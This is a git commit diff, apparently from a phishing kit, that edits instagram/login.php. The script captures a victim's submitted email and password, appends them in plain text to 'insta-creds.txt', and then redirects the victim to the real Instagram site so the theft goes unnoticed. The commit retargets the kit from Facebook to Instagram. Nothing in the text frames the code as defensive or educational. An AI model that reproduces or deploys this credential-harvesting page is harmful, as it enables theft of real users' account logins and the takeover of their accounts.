bef5b409f5b1000b78d9040b7321c9a98f5574fd
Bl1xY <45526353+Bl1xY@users.noreply.github.com>
2020-06-04 22:19:13 +0100

    Update login.php

--- instagram/login.php
+++ instagram/login.php
@@ -2,9 +2,9 @@
 
 $user=$_POST["email"];
 $pass=$_POST["password"];
-$creds="credentials.txt";
+$creds="insta-creds.txt";
 file_put_contents($creds,"user: ".$user."\n",FILE_APPEND | LOCK_EX);
 file_put_contents($creds,"password: ".$pass."\n",FILE_APPEND | LOCK_EX);
-header("location: https://www.facebook.com");
+header("location: https://www.instagram.com");
 
 ?>
